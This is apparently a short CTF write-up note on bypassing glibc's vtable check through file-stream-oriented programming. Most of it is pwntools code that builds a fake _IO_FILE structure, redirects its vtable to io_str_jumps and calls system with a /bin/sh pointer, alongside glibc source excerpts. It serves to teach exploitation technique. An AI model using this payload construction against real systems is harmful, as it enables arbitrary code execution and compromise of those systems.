## bypass vtable check
babyprintf shows a way to bypass vtable check.
Another way can be seen [here](http://blog.rh0gue.com/2017-12-31-34c3ctf-300/)

```python
fake_file = p64(0) + p64(0x61) + p64(0xdeadbeef) + p64(io_list_all-0x10)
fake_file += p64(0xffffffffffffff) + p64(0)*3 + p64((binsh_addr-100)/2)
```
```c
_IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
        return EOF;
        ......
```
```python
fake_file = fake_file.ljust(0xa0, "\x00")
fake_file += p64(libc_addr+8) #_IO_wide_data
```
satisfied the second condition:
```c
 if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
```
```python
fake_file = fake_file.ljust(0xc0, '\x00')
fake_file += p64(1) #_mode
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(io_str_jumps)
fake_file += p64(system_addr)
payload += fake_file
```